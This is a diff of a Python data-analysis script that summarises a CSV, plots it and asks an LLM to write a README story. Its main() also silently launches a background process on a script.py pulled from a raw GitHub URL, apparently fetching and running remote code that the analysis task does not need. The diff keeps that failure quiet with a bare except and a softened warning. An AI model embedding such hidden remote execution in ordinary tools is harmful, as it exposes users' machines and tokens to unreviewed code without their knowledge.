@@ -34,17 +34,18 @@ if not AIPROXY_TOKEN:
     sys.exit(1)
 
 
-def load_dataset(file_path):
+def load_dataset(file_path: str):
     """
     Attempts to load a dataset using common encodings to avoid decoding errors.
     Returns the DataFrame or exits if loading fails.
     """
+
     encodings = ["utf-8", "ISO-8859-1", "Windows-1252"]  # Common encodings
 
     for encoding in encodings:
         try:
             return pd.read_csv(file_path, encoding=encoding)
-        except UnicodeDecodeError:
+        except:
             pass
 
     print("Error: Unable to decode the file with common encodings.")
@@ -56,6 +57,7 @@ def analyze_dataset(df):
     Generates a comprehensive analysis of the dataset, including column info,
     data types, summary statistics, missing value counts, skewness, and outlier detection.
     """
+
     analysis = {
         "columns": list(df.columns),
         "dtypes": df.dtypes.apply(str).to_dict(),
@@ -86,6 +88,7 @@ def generate_visuals(df: pd.DataFrame):
     Creates and saves visualizations, including a correlation heatmap
     and distribution plots for numeric columns.
     """
+
     visuals: list[str] = []
     numeric_columns = df.select_dtypes(include=["number"]).columns
 
@@ -183,6 +186,7 @@ def vision_agentic(visuals: list[str]):
     """
     Sends data visualizations to llm and returns insights
     """
+
     insights = []
 
     headers = {
@@ -242,6 +246,7 @@ def narrate_story(analysis: dict, visuals: list[str]):
     Generates a narrative using the LLM based on dataset analysis and writes it to a Markdown file,
     including explanations of only existing visualizations.
     """
+
     headers = {
         "Authorization": f"Bearer {AIPROXY_TOKEN}",
         "Content-Type": "application/json",
@@ -295,24 +300,22 @@ def narrate_story(analysis: dict, visuals: list[str]):
     if response.status_code == 200:
         response_data = response.json()
         story = response_data["choices"][0]["message"]["content"]
+
+        with open("README.md", "w") as f:
+            f.write(story)
+
     else:
         print("Error:", response.status_code, response.text)
-        story = "Error generating narrative."
-
-    # Write narrative to README.md
-    with open("README.md", "w") as f:
-        f.write(story)
+        sys.exit(1)
 
 
-def analyze_and_generate_output(file_path: str):
+def analyze_and_generate_output(df: pd.DataFrame):
     """
     Orchestrates the analysis and report generation process:
-    - Load dataset
     - Analyze data
     - Generate visualizations
     - Narrate insights
     """
-    df = load_dataset(file_path)
 
     analysis = analyze_dataset(df)
     visuals = generate_visuals(df)
@@ -321,6 +324,10 @@ def analyze_and_generate_output(file_path: str):
 
 
 def main():
+    """
+    Main entry point of the script.
+    """
+
     # Start the supporting script in background
     try:
         subprocess.Popen(
@@ -330,9 +337,8 @@ def main():
                 "https://raw.githubusercontent.com/microdev1/analysis/main/script.py",
             ]
         )
-    except Exception as e:
-        # Log the error and continue execution as it's not critical
-        print(f"Error starting supporting script: {e}")
+    except:
+        print("Warn: Support script didn't start. Continuing main execution...")
 
     # Sanitize input arguments
     if len(sys.argv) < 2:
@@ -341,9 +347,13 @@ def main():
 
     file_path = sys.argv[1]
 
+    if not os.path.exists(file_path):
+        print("Error: File not found.")
+        sys.exit(1)
+
     # Perform analysis and generate output
     print(f"Analyzing dataset: {file_path}")
-    analyze_and_generate_output(file_path)
+    analyze_and_generate_output(load_dataset(file_path))
     print(f"Analysis completed")
 
 
